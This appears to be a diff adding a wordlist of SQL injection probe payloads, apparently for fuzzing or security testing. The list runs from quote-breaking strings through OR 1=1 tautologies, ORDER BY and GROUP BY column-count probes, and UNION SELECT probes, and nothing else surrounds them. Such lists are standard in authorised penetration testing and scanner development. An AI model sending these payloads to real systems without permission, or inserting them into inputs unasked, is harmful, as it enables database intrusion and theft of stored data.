@@ -1,0 +1,17 @@
+'
+"
+`
+'--
+"--
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+')
+"))
+'))
+' ORDER BY 1--
+' ORDER BY 100--
+' GROUP BY 1--
+' UNION SELECT 1--
+' UNION SELECT NULL--
